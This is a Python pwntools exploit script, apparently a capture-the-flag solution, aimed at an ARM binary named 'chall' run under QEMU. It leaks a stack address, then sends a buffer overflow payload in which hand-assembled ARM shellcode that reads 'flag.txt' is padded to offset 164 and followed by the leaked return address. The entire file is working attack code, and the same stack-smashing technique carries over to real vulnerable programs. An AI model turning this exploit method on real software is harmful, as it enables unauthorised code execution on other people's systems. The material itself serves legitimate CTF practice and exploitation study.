#!/usr/bin/env python3
from pwn import *
import struct
import time

def send(p, msg):
    try:
        p.send(msg)
        time.sleep(2)
        return p.recv(1024).decode()
    except:
        return ''

# Generated shellcode for execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)
shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x00\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
offset = 164  # Adjusted offset accounting for shellcode behavior

print('[!] Shellcode length: {}'.format(len(shellcode)))

# Start ARM binary using QEMU
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './chall'])
time.sleep(2)

# Wait for initial prompt
resp = p.recv(1024)
if 'Give me data to dump' not in resp.decode():
    print('[-] Failed to get initial message')
    exit(1)
print('[+] Communication started')

# Step 1: Leak stack address
resp = send(p, b'A\n')
if 'Dump again' not in resp:
    print('[-] Failed to leak address')
    exit(1)

# Extract stack address from dump output
stack = resp.split(':')[0]
print('[+] Stack address: {}'.format(stack))

# Continue to next input
resp = send(p, b'y\n')
if 'Give me data to dump' not in resp:
    print('[-] Failed to continue')
    exit(1)

# Step 2: Build and send exploit payload
stack_addr = struct.pack('I', int(stack, 16))
payload = shellcode + b'A' * (offset - len(shellcode)) + stack_addr + b'\n'

resp = send(p, payload)
if 'Dump again' not in resp:
    print('[-] Failed to send shellcode')
    exit(1)
print('[+] Shellcode sent')

# Step 3: Trigger the exploit
resp = send(p, b'n\n')
print('[+] Output: {}'.format(resp.strip()))

p.close()